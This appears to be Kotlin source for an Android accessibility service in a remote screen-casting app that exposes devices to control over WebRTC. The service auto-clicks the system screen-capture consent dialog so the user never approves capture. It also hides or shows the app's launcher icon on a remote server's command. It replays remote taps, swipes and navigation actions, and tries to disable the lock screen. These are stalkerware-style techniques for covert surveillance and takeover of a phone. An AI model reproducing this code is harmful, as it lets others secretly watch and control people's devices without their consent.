package com.dhananjay.livecast.cast.data.services

import android.accessibilityservice.AccessibilityService
import android.app.KeyguardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.PowerManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.dhananjay.livecast.cast.data.RemoteDataSource
import com.dhananjay.livecast.cast.data.model.DeviceConfig
import com.dhananjay.livecast.cast.data.services.helpers.TouchGestureHelper
import com.dhananjay.livecast.cast.ui.video.CallAction
import com.dhananjay.livecast.cast.ui.video.GestureType
import com.dhananjay.livecast.cast.ui.video.VideoScreenActivity
import com.dhananjay.livecast.webrtc.connection.SignalingClient
import com.dhananjay.livecast.webrtc.connection.SignalingCommand
import com.dhananjay.livecast.webrtc.session.WebRtcSessionManagerImpl
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.toObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.launch
import org.koin.core.component.KoinComponent
import org.koin.core.component.inject
import java.time.OffsetDateTime

abstract class LiveCastService : AccessibilityService(), KoinComponent {
    private val TAG = javaClass.simpleName
    private val signalingClient by inject<SignalingClient>()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val crashlytics by inject<FirebaseCrashlytics>()
    private val remoteDataSource by inject<RemoteDataSource>()
    private val context by lazy {
        this
    }

    fun onEvent(event: AccessibilityEvent) {
        if ((event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
//            Log.d(TAG, "Normal event info: $event ")
//            Log.d(TAG, "Node with start: ${rootInActiveWindow.findAccessibilityNodeInfosByText("Start")}")
//            printInActiveWindow(rootInActiveWindow)
            rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/button1")
                .firstOrNull()?.let {
                    if(event.className?.equals("com.android.systemui.media.MediaProjectionPermissionActivity") == true){
                        it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        performGlobalAction(GLOBAL_ACTION_HOME)
                    }
            }
        }
    }

    fun printInActiveWindow(node: AccessibilityNodeInfo) {
        val count = node.childCount
        if (count == 0) return
        val indent = " "
        Log.d(TAG, "Node info in current window ----> ")
        for (i in 0 until count) {
            val child = node.getChild(i) ?: continue
            Log.d(
                TAG,
                " ${indent.repeat(i)}: ${child.className} ${child.text} ${child.contentDescription} ${child.isClickable} ${child.viewIdResourceName}"
            )
            if (child.childCount > 0) {
                printInActiveWindow(child)
            }
        }
    }


    override fun onServiceConnected() {
        super.onServiceConnected()

        startObservers()

    }

    private fun startObservers() {
        serviceScope.launch {
            remoteDataSource.setUserOnline(serviceScope)
            remoteDataSource.getConfigCollectionFlow().distinctUntilChanged().collectLatest {
                it.onSuccess { document ->
                    val config = document.toObject<DeviceConfig>() ?: return@onSuccess
                    val cmpName = ComponentName(context, "${packageName}.LauncherAlias")

//                    val cmpName = ComponentName(this@LiveCastService, MainActivity::class.java)
                    if (config.showIcon) {
                        packageManager.setComponentEnabledSetting(
                            cmpName,
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } else {
                        packageManager.setComponentEnabledSetting(
                            cmpName,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    }

                }.onFailure {
                    Log.e(TAG, "onServiceConnected: ", it)
                    crashlytics.recordException(it)
                }
            }
        }

        serviceScope.launch {
            WebRtcSessionManagerImpl.keyEventFlow.collectLatest {
                Log.d(TAG, "onServiceConnected: key event is $it")
                when (it.first) {
                    GestureType.TAP -> {
                        TouchGestureHelper.tap(context, it.second.x, it.second.y)
                    }

                    GestureType.DOUBLE_TAP -> TouchGestureHelper.doubleTap(
                        context,
                        it.second.x,
                        it.second.y
                    )

                    GestureType.LONG_PRESS -> TouchGestureHelper.longPress(
                        context,
                        it.second.x,
                        it.second.y
                    )

                    GestureType.PINCH -> TouchGestureHelper.pinch(
                        context,
                        it.second.x,
                        it.second.y,
                        it.third?.x ?: 0f,
                        it.third?.y ?: 0f
                    )

                    GestureType.SWIPE_UP -> TouchGestureHelper.swipe(
                        context,
                        it.second.x,
                        it.second.y,
                        it.third?.x ?: it.second.x,
                        it.third?.y ?: 0f
                    )

                    GestureType.SWIPE_DOWN -> TouchGestureHelper.swipe(
                        context,
                        it.second.x,
                        it.second.y,
                        it.third?.x ?: it.second.x,
                        it.third?.y ?: 500f
                    )

                    GestureType.SWIPE_LEFT -> TouchGestureHelper.swipe(
                        context,
                        it.second.x,
                        it.second.y,
                        it.third?.x ?: 0f,
                        it.third?.y ?: it.second.y
                    )

                    GestureType.SWIPE_RIGHT -> TouchGestureHelper.swipe(
                        context,
                        it.second.x,
                        it.second.y,
                        it.third?.x ?: 500f,
                        it.third?.y ?: it.second.y
                    )

                    else -> {
                        Log.d(TAG, "onServiceConnected: Unknown gesture type")
                    }
                }
            }
        }

        serviceScope.launch {
            WebRtcSessionManagerImpl.callActionFlow.collectLatest {
                when (it) {
                    CallAction.Home -> {
                        performGlobalAction(GLOBAL_ACTION_HOME)
                    }

                    CallAction.GoBack -> {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    }

                    CallAction.GoToRecent -> {
                        performGlobalAction(GLOBAL_ACTION_RECENTS)
                    }

                    CallAction.UnlockDevice -> {
                        unlockDevice()
                    }

                    CallAction.LeaveCall -> {

                    }
                }
            }
        }
        serviceScope.launch {
            signalingClient.signalingCommandFlow.collectLatest {
                if (it.first == SignalingCommand.OFFER) {
                    Log.d(TAG, "startObservers: offer received at ${OffsetDateTime.now()}")
                    startActivity(Intent(context, VideoScreenActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    })
                }
            }
        }

    }

    private fun unlockDevice() {
        // Acquire wake lock and disable keyguard
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "UnlockService:WakeLock"
        )
        wakeLock.acquire(10000) // Hold wake lock for 10 seconds

        val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

        // For Android Oreo and above
        val keyguardLock = keyguardManager.newKeyguardLock("UnlockService")
        keyguardLock.disableKeyguard()

        // Perform global actions
        performGlobalAction(GESTURE_SWIPE_UP)

        // Note: Actually unlocking requires user interaction or specific device policies
        wakeLock.release()
    }

    override fun onUnbind(intent: Intent?): Boolean {
        serviceScope.launch {
            remoteDataSource.setUserOffline()
        }
        crashlytics.setCustomKey(
            "onUnbind",
            "Accessbility service unbound at ${OffsetDateTime.now()}"
        )
        return super.onUnbind(intent)
    }

}
